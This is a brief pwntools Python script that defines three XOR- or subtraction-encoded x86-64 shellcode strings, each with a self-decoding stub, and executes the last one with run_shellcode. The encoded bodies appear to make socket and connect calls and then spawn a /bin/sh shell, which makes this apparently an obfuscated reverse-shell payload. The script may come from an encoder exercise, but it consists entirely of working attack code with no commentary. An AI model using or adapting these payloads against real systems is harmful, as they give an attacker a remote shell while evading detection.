from pwn import *
import sys

context(arch="amd64", os="linux") 

shellcode=b"\xeb\x17\x5e\x48\x31\xc9\x8a\x04\x0e\x34\xb3\x88\x04\x0e\x48\xff\xc1\x48\x83\xf9\x79\x75\xef\xff\xe6\xe8\xe4\xff\xff\xff\xd9\x9a\xeb\xd9\xb1\xec\xd9\xb2\xed\x2a\xbc\xb6\xfb\x3a\x76\xfb\x0b\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb1\xe3\xfb\x0b\xb0\xb2\xac\xd3\xcd\xb2\xb2\xb0\xfb\x82\xb7\x97\xd9\x99\xeb\xfb\x3a\x5c\xd9\xa3\xe9\xfb\x3a\x55\xbc\xb6\xd9\xb0\xed\xfb\x4c\x7d\xcb\xb8\xe5\xd9\x92\xeb\xfb\x3a\x5c\xbc\xb6\x58\x5c\xd9\xdb\xfb\x0b\x9c\xd1\xda\xdd\x9c\x9c\x9c\xc0\xe3\xfb\x3a\x54\xdb\xc1\xda\xb2\xb2\x32\x87\x97\xb2\xb2\xb2\xb2\x82\x45\xe5\xd9\xbb\xed\xfb\xb2\x55\xe5\xfb\x3a\x55\x82\x61\xd9\x88\xeb\xbc\xb6"
shellcode=b"\xeb\x19\x5e\xb9\x00\x00\x00\x00\x8a\x04\x0e\x34\xb3\x88\x04\x0e\x48\xff\xc1\x48\x83\xf9\x79\x75\xef\xff\xe6\xe8\xe2\xff\xff\xff\xd9\x9a\xeb\xd9\xb1\xec\xd9\xb2\xed\x2a\xbc\xb6\xfb\x3a\x76\xfb\x0b\xb2\xb2\xb2\xb2\xb2\xb2\xb2\xb1\xe3\xfb\x0b\xb0\xb2\xac\xd3\xcd\xb2\xb2\xb0\xfb\x82\xb7\x97\xd9\x99\xeb\xfb\x3a\x5c\xd9\xa3\xe9\xfb\x3a\x55\xbc\xb6\xd9\xb0\xed\xfb\x4c\x7d\xcb\xb8\xe5\xd9\x92\xeb\xfb\x3a\x5c\xbc\xb6\x58\x5c\xd9\xdb\xfb\x0b\x9c\xd1\xda\xdd\x9c\x9c\x9c\xc0\xe3\xfb\x3a\x54\xdb\xc1\xda\xb2\xb2\x32\x87\x97\xb2\xb2\xb2\xb2\x82\x45\xe5\xd9\xbb\xed\xfb\xb2\x55\xe5\xfb\x3a\x55\x82\x61\xd9\x88\xeb\xbc\xb6"
shellcode=b"\xeb\x17\x5e\x48\x31\xc9\x8a\x04\x0e\x2c\x11\x88\x04\x0e\x48\xff\xc1\x48\x83\xf9\x79\x75\xef\xff\xe6\xe8\xe4\xff\xff\xff\x7b\x3a\x69\x7b\x13\x70\x7b\x12\x6f\xaa\x20\x16\x59\x9a\xd6\x59\xc9\x12\x12\x12\x12\x12\x12\x12\x13\x61\x59\xc9\x14\x12\x30\x71\x8f\x12\x12\x14\x59\x42\x15\x35\x7b\x3b\x69\x59\x9a\x00\x7b\x21\x6b\x59\x9a\xf7\x20\x16\x7b\x14\x6f\x59\x10\xdf\x89\x1c\x67\x7b\x32\x69\x59\x9a\x00\x20\x16\xfc\x00\x7b\x79\x59\xc9\x40\x73\x7a\x7f\x40\x40\x40\x84\x61\x59\x9a\xf8\x79\x83\x7a\x12\x12\x92\x45\x35\x12\x12\x12\x12\x42\x07\x67\x7b\x19\x6f\x59\x12\xf7\x67\x59\x9a\xf7\x42\xe3\x7b\x4c\x69\x20\x16"

p = run_shellcode(shellcode)
p.wait_for_close()
p.poll()